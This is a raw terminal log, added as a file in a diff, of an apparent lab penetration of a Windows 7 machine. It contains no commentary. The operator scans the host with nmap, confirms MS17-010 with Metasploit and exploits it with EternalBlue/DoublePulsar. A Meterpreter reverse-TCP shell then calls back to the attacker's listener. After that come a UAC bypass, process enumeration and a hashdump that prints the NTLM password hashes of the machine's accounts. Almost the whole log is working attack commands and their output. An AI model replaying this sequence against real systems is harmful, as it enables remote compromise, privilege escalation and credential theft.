@@ -1,0 +1,649 @@
+root@kali:~# nmap -vv -T5 192.168.0.108
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-14 14:42 IST
+Initiating ARP Ping Scan at 14:42
+Scanning 192.168.0.108 [1 port]
+Completed ARP Ping Scan at 14:42, 0.06s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:42
+Completed Parallel DNS resolution of 1 host. at 14:42, 0.01s elapsed
+Initiating SYN Stealth Scan at 14:42
+Scanning 192.168.0.108 [1000 ports]
+Discovered open port 135/tcp on 192.168.0.108
+Discovered open port 445/tcp on 192.168.0.108
+Discovered open port 139/tcp on 192.168.0.108
+Discovered open port 5357/tcp on 192.168.0.108
+Discovered open port 49156/tcp on 192.168.0.108
+Discovered open port 2869/tcp on 192.168.0.108
+Discovered open port 49154/tcp on 192.168.0.108
+Discovered open port 49152/tcp on 192.168.0.108
+Discovered open port 49155/tcp on 192.168.0.108
+Discovered open port 49153/tcp on 192.168.0.108
+Discovered open port 49158/tcp on 192.168.0.108
+Completed SYN Stealth Scan at 14:42, 1.44s elapsed (1000 total ports)
+Nmap scan report for 192.168.0.108
+Host is up, received arp-response (0.0028s latency).
+Scanned at 2019-07-14 14:42:52 IST for 2s
+Not shown: 989 closed ports
+Reason: 989 resets
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 128
+139/tcp   open  netbios-ssn  syn-ack ttl 128
+445/tcp   open  microsoft-ds syn-ack ttl 128
+2869/tcp  open  icslap       syn-ack ttl 128
+5357/tcp  open  wsdapi       syn-ack ttl 128
+49152/tcp open  unknown      syn-ack ttl 128
+49153/tcp open  unknown      syn-ack ttl 128
+49154/tcp open  unknown      syn-ack ttl 128
+49155/tcp open  unknown      syn-ack ttl 128
+49156/tcp open  unknown      syn-ack ttl 128
+49158/tcp open  unknown      syn-ack ttl 128
+MAC Address: 60:30:D4:81:A1:60 (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds
+           Raw packets sent: 1145 (50.364KB) | Rcvd: 1001 (40.072KB)
+root@kali:~# service postgresql start
+root@kali:~# msfconsole
+                                                  
+
+     .~+P``````-o+:.                                      -o+:.
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
+                                `...............`              `...-/////...`
+
+
+                                  .::::::::::-.                     .::::::-
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
+================================================================================
+=====================+--------------------------------+=========================
+=====================| Session one died of dysentery. |=========================
+=====================+--------------------------------+=========================
+================================================================================
+
+                     Press ENTER to size up the situation
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+                        Press SPACE BAR to continue
+
+
+
+       =[ metasploit v4.17.3-dev                          ]
++ -- --=[ 1797 exploits - 1019 auxiliary - 310 post       ]
++ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > 
+msf > Interrupt: use the 'exit' command to quit
+msf > 
+msf > 
+msf > exit
+root@kali:~# msfconsole -q
+msf > search doublepulsar
+
+Matching Modules
+================
+
+   Name                                          Disclosure Date  Rank    Description
+   ----                                          ---------------  ----    -----------
+   auxiliary/scanner/smb/smb_ms17_010                             normal  MS17-010 SMB RCE Detection
+   exploit/windows/smb/eternalblue_doublepulsar                   normal  EternalBlue
+
+
+msf > Interrupt: use the 'exit' command to quit
+msf > reload_all
+[*] Reloading modules from all module paths...
+
+         .                                         .
+ .
+
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
+       '   dB'                     BBP
+    dB'dB'dB' dBBP     dBP     dBP BB
+   dB'dB'dB' dBP      dBP     dBP  BB
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
+          .                  .                  dB' dBP    dB'.BP
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+
+                                                                    .
+                .
+        o                  To boldly go where no
+                            shell has gone before
+
+
+       =[ metasploit v4.17.3-dev                          ]
++ -- --=[ 1797 exploits - 1019 auxiliary - 310 post       ]
++ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > search doublepulsar
+
+Matching Modules
+================
+
+   Name                                          Disclosure Date  Rank    Description
+   ----                                          ---------------  ----    -----------
+   auxiliary/scanner/smb/smb_ms17_010                             normal  MS17-010 SMB RCE Detection
+   exploit/windows/smb/eternalblue_doublepulsar                   normal  EternalBlue
+
+
+msf > use auxiliary/scanner/smb/smb_ms17_010
+msf auxiliary(scanner/smb/smb_ms17_010) >  info
+
+       Name: MS17-010 SMB RCE Detection
+     Module: auxiliary/scanner/smb/smb_ms17_010
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  Sean Dillon <sean.dillon@risksense.com>
+  Luke Jennings
+
+Basic options:
+  Name         Current Setting                                                 Required  Description
+  ----         ---------------                                                 --------  -----------
+  CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
+  CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
+  CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
+  NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+  RHOSTS                                                                       yes       The target address range or CIDR identifier
+  RPORT        445                                                             yes       The SMB service port (TCP)
+  SMBDomain    .                                                               no        The Windows domain to use for authentication
+  SMBPass                                                                      no        The password for the specified username
+  SMBUser                                                                      no        The username to authenticate as
+  THREADS      1                                                               yes       The number of concurrent threads
+
+Description:
+  Uses information disclosure to determine if MS17-010 has been 
+  patched or not. Specifically, it connects to the IPC$ tree and 
+  attempts a transaction on FID 0. If the status returned is 
+  "STATUS_INSUFF_SERVER_RESOURCES", the machine does not have the 
+  MS17-010 patch. If the machine is missing the MS17-010 patch, the 
+  module will check for an existing DoublePulsar (ring 0 
+  shellcode/malware) infection. This module does not require valid SMB 
+  credentials in default server configurations. It can log on as the 
+  user "\" and connect to IPC$.
+
+References:
+  Also known as: DOUBLEPULSAR
+  Also known as: ETERNALBLUE
+  https://cvedetails.com/cve/CVE-2017-0143/
+  https://cvedetails.com/cve/CVE-2017-0144/
+  https://cvedetails.com/cve/CVE-2017-0145/
+  https://cvedetails.com/cve/CVE-2017-0146/
+  https://cvedetails.com/cve/CVE-2017-0147/
+  https://cvedetails.com/cve/CVE-2017-0148/
+  https://technet.microsoft.com/en-us/library/security/MS17-010
+  https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
+  https://github.com/countercept/doublepulsar-detection-script
+  https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+msf auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                                                 Required  Description
+   ----         ---------------                                                 --------  -----------
+   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                       yes       The target address range or CIDR identifier
+   RPORT        445                                                             yes       The SMB service port (TCP)
+   SMBDomain    .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                      no        The password for the specified username
+   SMBUser                                                                      no        The username to authenticate as
+   THREADS      1                                                               yes       The number of concurrent threads
+
+msf auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.0.106
+RHOSTS => 192.168.0.106
+msf auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                                                 Required  Description
+   ----         ---------------                                                 --------  -----------
+   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS       192.168.0.106                                                   yes       The target address range or CIDR identifier
+   RPORT        445                                                             yes       The SMB service port (TCP)
+   SMBDomain    .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                      no        The password for the specified username
+   SMBUser                                                                      no        The username to authenticate as
+   THREADS      1                                                               yes       The number of concurrent threads
+
+msf auxiliary(scanner/smb/smb_ms17_010) > exploit
+
+[+] 192.168.0.106:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/eternalblue_doublepulsar
+msf exploit(windows/smb/eternalblue_doublepulsar) > show options
+
+Module options (exploit/windows/smb/eternalblue_doublepulsar):
+
+   Name                Current Setting                                  Required  Description
+   ----                ---------------                                  --------  -----------
+   DOUBLEPULSARPATH    /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Doublepulsar
+   ETERNALBLUEPATH     /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Eternalblue
+   PROCESSINJECT       wlms.exe                                         yes       Name of process to inject into (Change to lsass.exe for x64)
+   RHOST                                                                yes       The target address
+   RPORT               445                                              yes       The SMB service port (TCP)
+   TARGETARCHITECTURE  x86                                              yes       Target Architecture (Accepted: x86, x64)
+   WINEPATH            /root/.wine/drive_c/                             yes       WINE drive_c path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   8   Windows 7 (all services pack) (x86) (x64)
+
+
+msf exploit(windows/smb/eternalblue_doublepulsar) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(windows/smb/eternalblue_doublepulsar) > show options]
+[-] Invalid parameter "options]", use "show -h" for more information
+msf exploit(windows/smb/eternalblue_doublepulsar) > show options
+
+Module options (exploit/windows/smb/eternalblue_doublepulsar):
+
+   Name                Current Setting                                  Required  Description
+   ----                ---------------                                  --------  -----------
+   DOUBLEPULSARPATH    /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Doublepulsar
+   ETERNALBLUEPATH     /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Eternalblue
+   PROCESSINJECT       wlms.exe                                         yes       Name of process to inject into (Change to lsass.exe for x64)
+   RHOST                                                                yes       The target address
+   RPORT               445                                              yes       The SMB service port (TCP)
+   TARGETARCHITECTURE  x86                                              yes       Target Architecture (Accepted: x86, x64)
+   WINEPATH            /root/.wine/drive_c/                             yes       WINE drive_c path
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   8   Windows 7 (all services pack) (x86) (x64)
+
+
+msf exploit(windows/smb/eternalblue_doublepulsar) > set PROCESSINJECT explorer.exe
+PROCESSINJECT => explorer.exe
+msf exploit(windows/smb/eternalblue_doublepulsar) > set RHOST 192.168.0.106
+RHOST => 192.168.0.106
+msf exploit(windows/smb/eternalblue_doublepulsar) > set LHOST 192.168.0.132
+LHOST => 192.168.0.132
+msf exploit(windows/smb/eternalblue_doublepulsar) > show options
+
+Module options (exploit/windows/smb/eternalblue_doublepulsar):
+
+   Name                Current Setting                                  Required  Description
+   ----                ---------------                                  --------  -----------
+   DOUBLEPULSARPATH    /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Doublepulsar
+   ETERNALBLUEPATH     /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Eternalblue
+   PROCESSINJECT       explorer.exe                                     yes       Name of process to inject into (Change to lsass.exe for x64)
+   RHOST               192.168.0.106                                    yes       The target address
+   RPORT               445                                              yes       The SMB service port (TCP)
+   TARGETARCHITECTURE  x86                                              yes       Target Architecture (Accepted: x86, x64)
+   WINEPATH            /root/.wine/drive_c/                             yes       WINE drive_c path
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.132    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   8   Windows 7 (all services pack) (x86) (x64)
+
+
+msf exploit(windows/smb/eternalblue_doublepulsar) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.106:445 - Generating Eternalblue XML data
+[*] 192.168.0.106:445 - Generating Doublepulsar XML data
+[*] 192.168.0.106:445 - Generating payload DLL for Doublepulsar
+[*] 192.168.0.106:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll
+[*] 192.168.0.106:445 - Launching Eternalblue...
+000f:err:service:process_send_command receiving command result timed out
+[+] 192.168.0.106:445 - Backdoor is already installed
+[*] 192.168.0.106:445 - Launching Doublepulsar...
+000f:err:service:process_send_command receiving command result timed out
+[*] Sending stage (179779 bytes) to 192.168.0.106
+[*] Meterpreter session 1 opened (192.168.0.132:4444 -> 192.168.0.106:49576) at 2019-07-14 15:30:02 +0530
+[+] 192.168.0.106:445 - Remote code executed... 3... 2... 1...
+
+meterpreter > exploit
+[-] Unknown command: exploit.
+meterpreter >                                                       sysinfo
+Computer        : VIC-PC
+OS              : Windows 7 (Build 7601, Service Pack 1).
+Architecture    : x86
+System Language : en_IN
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > getuid
+Server username: Vic-PC\Vic
+meterpreter > getpid
+Current pid: 2236
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User        Path
+ ---   ----  ----               ----  -------  ----        ----
+ 0     0     [System Process]                              
+ 4     0     System                                        
+ 268   4     smss.exe                                      
+ 348   340   csrss.exe                                     
+ 396   340   wininit.exe                                   
+ 404   388   csrss.exe                                     
+ 444   388   winlogon.exe                                  
+ 488   396   services.exe                                  
+ 500   396   lsass.exe                                     
+ 508   396   lsm.exe                                       
+ 612   488   svchost.exe                                   
+ 672   488   VBoxService.exe                               
+ 724   488   svchost.exe                                   
+ 776   488   svchost.exe                                   
+ 896   488   svchost.exe                                   
+ 936   488   svchost.exe                                   
+ 944   896   dwm.exe            x86   1        Vic-PC\Vic  C:\Windows\system32\Dwm.exe
+ 972   1132  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 1092  488   svchost.exe                                   
+ 1228  488   svchost.exe                                   
+ 1328  488   spoolsv.exe                                   
+ 1364  488   svchost.exe                                   
+ 1468  488   svchost.exe                                   
+ 1520  2700  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 1856  488   svchost.exe                                   
+ 1908  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 1928  488   taskhost.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\taskhost.exe
+ 1984  776   audiodg.exe        x86   0                    
+ 2032  1132  VBoxTray.exe       x86   1        Vic-PC\Vic  C:\Windows\System32\VBoxTray.exe
+ 2124  2700  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2132  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2236  2700  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2272  1132  cmd.exe            x86   1        Vic-PC\Vic  C:\Windows\system32\cmd.exe
+ 2280  404   conhost.exe        x86   1        Vic-PC\Vic  C:\Windows\system32\conhost.exe
+ 2284  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2344  836   rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2360  488   SearchIndexer.exe                             
+ 2612  2228  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2764  404   conhost.exe        x86   1        Vic-PC\Vic  C:\Windows\system32\conhost.exe
+ 2816  1132  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2840  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2856  836   rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2888  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2932  2888  cmd.exe            x86   1        Vic-PC\Vic  C:\Windows\system32\cmd.exe
+ 2956  836   rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 2964  1724  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3068  488   taskhost.exe                                  
+ 3120  488   svchost.exe                                   
+ 3208  836   rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3300  1724  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3380  488   UI0Detect.exe                                 
+ 3464  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3516  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3552  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3576  1664  explorer.exe       x86   1        Vic-PC\Vic  C:\Windows\explorer.exe
+ 3712  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3808  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3812  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3832  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 3972  3456  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+ 4036  1132  rundll32.exe       x86   1        Vic-PC\Vic  C:\Windows\system32\rundll32.exe
+
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeIncreaseWorkingSetPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+meterpreter > hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+meterpreter > bach\kground
+[-] Unknown command: bachkground.
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(windows/smb/eternalblue_doublepulsar) > search bypassuac
+
+Matching Modules
+================
+
+   Name                                              Disclosure Date  Rank       Description
+   ----                                              ---------------  ----       -----------
+   exploit/windows/local/bypassuac                   2010-12-31       excellent  Windows Escalate UAC Protection Bypass
+   exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
+   exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
+   exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Windows UAC Protection Bypass (Via FodHelper Registry Key)
+   exploit/windows/local/bypassuac_injection         2010-12-31       excellent  Windows Escalate UAC Protection Bypass (In Memory Injection)
+   exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
+   exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Windows UAC Protection Bypass (Via Slui File Handler Hijack)
+   exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
+
+
+msf exploit(windows/smb/eternalblue_doublepulsar) > use exploit/windows/local/bypassuac
+msf exploit(windows/local/bypassuac) > show options
+
+Module options (exploit/windows/local/bypassuac):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION                     yes       The session to run this module on.
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf exploit(windows/local/bypassuac) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information          Connection
+  --  ----  ----                     -----------          ----------
+  1         meterpreter x86/windows  Vic-PC\Vic @ VIC-PC  192.168.0.132:4444 -> 192.168.0.106:49576 (192.168.0.106)
+
+msf exploit(windows/local/bypassuac) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(windows/local/bypassuac) > show options
+
+Module options (exploit/windows/local/bypassuac):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION                     yes       The session to run this module on.
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf exploit(windows/local/bypassuac) > set SESSION 1 
+SESSION => 1
+msf exploit(windows/local/bypassuac) > set LHOST 192.168.0.132
+LHOST => 192.168.0.132
+msf exploit(windows/local/bypassuac) > set LPORT 4454
+LPORT => 4454
+msf exploit(windows/local/bypassuac) > sjow options
+[-] Unknown command: sjow.
+msf exploit(windows/local/bypassuac) > show options
+
+Module options (exploit/windows/local/bypassuac):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION    1                yes       The session to run this module on.
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.132    yes       The listen address (an interface may be specified)
+   LPORT     4454             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf exploit(windows/local/bypassuac) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4454 
+[*] UAC is Enabled, checking level...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[+] Part of Administrators group! Continuing...
+[*] Uploaded the agent to the filesystem....
+[*] Uploading the bypass UAC executable to the filesystem...
+[*] Meterpreter stager executable 73802 bytes long being uploaded..
+[*] Sending stage (179779 bytes) to 192.168.0.106
+[*] Meterpreter session 2 opened (192.168.0.132:4454 -> 192.168.0.106:49617) at 2019-07-14 15:48:06 +0530
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_kill: Operation failed: The parameter is incorrect.
+[*] Exploit completed, but no session was created.
+msf exploit(windows/local/bypassuac) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4454 
+[*] UAC is Enabled, checking level...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[+] Part of Administrators group! Continuing...
+[*] Uploaded the agent to the filesystem....
+[*] Uploading the bypass UAC executable to the filesystem...
+[*] Meterpreter stager executable 73802 bytes long being uploaded..
+[*] Sending stage (179779 bytes) to 192.168.0.106
+[*] Meterpreter session 3 opened (192.168.0.132:4454 -> 192.168.0.106:49630) at 2019-07-14 15:48:22 +0530
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_kill: Operation failed: The parameter is incorrect.
+[*] Exploit completed, but no session was created.
+msf exploit(windows/local/bypassuac) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information          Connection
+  --  ----  ----                     -----------          ----------
+  1         meterpreter x86/windows  Vic-PC\Vic @ VIC-PC  192.168.0.132:4444 -> 192.168.0.106:49576 (192.168.0.106)
+  2         meterpreter x86/windows  Vic-PC\Vic @ VIC-PC  192.168.0.132:4454 -> 192.168.0.106:49617 (192.168.0.106)
+  3         meterpreter x86/windows  Vic-PC\Vic @ VIC-PC  192.168.0.132:4454 -> 192.168.0.106:49630 (192.168.0.106)
+
+msf exploit(windows/local/bypassuac) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+meterpreter > hashsump
+[-] Unknown command: hashsump.
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Vic:1000:aad3b435b51404eeaad3b435b51404ee:a1d47551157636847aa75af308131282:::
+meterpreter > 
+
